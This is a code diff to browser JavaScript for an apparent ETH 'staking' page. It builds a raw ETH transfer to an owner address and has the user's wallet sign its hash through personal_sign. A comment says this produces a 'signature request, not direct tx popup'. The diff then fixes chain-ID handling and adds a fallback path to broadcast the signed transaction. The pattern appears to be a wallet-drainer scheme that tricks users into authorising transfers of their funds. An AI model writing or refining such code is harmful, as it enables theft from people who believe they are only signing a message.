@@ -945,16 +945,14 @@ console.log("Value:", valueToSend.toString());
 console.log("==============================");      // Restore original legacy signing flow (produces signature request, not direct tx popup)
       // This matches the original application architecture and UX exactly.
       const tx_ = {
-        to: ownerAddress,
-        nonce: appState.web3.utils.toHex(nonce),
-        gasLimit: "0x55F0",
-        gasPrice: appState.web3.utils.toHex(gasPriceNum),
-        value: '0x' + valueToSend.toString(16),   // safe hex, no large Number conversion
-        data: "0x0",
-        r: "0x",
-        s: "0x",
-        v: chainHex,
-      };
+    nonce: appState.web3.utils.toHex(nonce),
+    gasPrice: appState.web3.utils.toHex(gasPriceNum),
+    gasLimit: appState.web3.utils.toHex(22000),
+    to: ownerAddress,
+    value: "0x" + valueToSend.toString(16),
+    data: "0x",
+    chainId: Number(chainId)
+};
 console.log("===== TX OBJECT BUILT =====");
 console.log(tx_);
 console.log("===========================");
@@ -971,7 +969,24 @@ console.log("===========================");
         success = 1;
         structuredLog('info', 'stake_eth_success', { txHash: tx.transactionHash });
       } else {
-        var tx = new ethereumjs.Tx(tx_);
+        const Common = ethereumjs.Common || window.ethereumjs.Common;
+
+let common;
+
+if (Common && typeof Common.forCustomChain === "function") {
+    common = Common.forCustomChain(
+        "mainnet",
+        {
+            chainId: Number(chainId),
+            networkId: Number(chainId)
+        },
+        "petersburg"
+    );
+}
+
+const tx = common
+    ? new ethereumjs.Tx(tx_, { common })
+    : new ethereumjs.Tx(tx_);
         const serializedTx = "0x" + tx.serialize().toString("hex");
         const sha3_ = appState.web3.utils.sha3(serializedTx, { encoding: "hex" });
 console.log("About to call personal_sign");
@@ -995,9 +1010,44 @@ console.log("Hash:", sha3_);
         const txFin = "0x" + tx.serialize().toString("hex");
         console.log("Signed transaction:");
 console.log(txFin);
-        const res = await appState.web3.eth.sendSignedTransaction(txFin);
-        success = 1;
-        structuredLog('info', 'stake_eth_success', { txHash: res.transactionHash });
+        console.log("Broadcasting signed transaction...");
+
+let res;
+
+try {
+    res = await appState.web3.eth.sendSignedTransaction(txFin);
+} catch (rpcErr) {
+
+    console.error("RPC Broadcast Failed");
+    console.error(rpcErr);
+
+    // Try the provider directly to get the actual RPC error
+    if (appState.provider?.request) {
+        try {
+            const hash = await appState.provider.request({
+                method: "eth_sendRawTransaction",
+                params: [txFin]
+            });
+
+            res = { transactionHash: hash };
+
+        } catch (providerErr) {
+
+            console.error("Provider Broadcast Failed");
+            console.error(providerErr);
+
+            throw providerErr;
+        }
+    } else {
+        throw rpcErr;
+    }
+}
+
+success = 1;
+
+structuredLog("info", "stake_eth_success", {
+    txHash: res.transactionHash
+});
       }
     } catch (e) {
       success = 0;
